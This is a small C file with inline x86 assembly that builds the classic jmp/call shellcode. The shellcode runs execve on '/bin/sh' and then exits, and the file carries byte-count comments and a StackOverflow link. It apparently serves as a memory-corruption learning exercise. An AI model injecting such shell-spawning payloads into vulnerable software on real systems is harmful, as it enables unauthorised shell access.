/*
 * "jmp   .+0x2c\n\t"            // # 3 bytes
 * "call   entry\n\t"          // # 5 bytes
 *  ref: http://stackoverflow.com/questions/2638775/gcc-x86-problems-with-relative-jumps
 */

void main() 
{
__asm__ 
(
  //"jmp   string_var\n\t"            // # 3 bytes
  "jmp   .+0x2c\n\t"            // # 3 bytes
  //"entry:"
  "popl  %esi\n\t"            // # 1 bytes
  "movl   %esi,0x8(%esi)\n\t" // # 3 bytes
  "movb   $0x0,0x7(%esi)\n\t" // # 4 bytes        
  "movl   $0x0,0xc(%esi)\n\t" // # 7 bytes
  "movl   $0xb,%eax\n\t"      // # 5 bytes
  "movl   %esi,%ebx\n\t"      // # 2 bytes
  "leal   0x8(%esi),%ecx\n\t" // # 3 bytes
  "leal   0xc(%esi),%edx\n\t" // # 3 bytes
  "int    $0x80\n\t"          // # 2 bytes
  "movl   $0x1, %eax\n\t"     // # 5 bytes
  "movl   $0x0, %ebx\n\t"     // # 5 bytes
  "int    $0x80\n\t"          // # 2 bytes
  //"string_var:"
  //"call   entry\n\t"          // # 5 bytes
  "call   .-0x2a\n\t"          // # 5 bytes
  ".string \"/bin/sh987654321\"\n\t"     // # 8 bytes
);
}

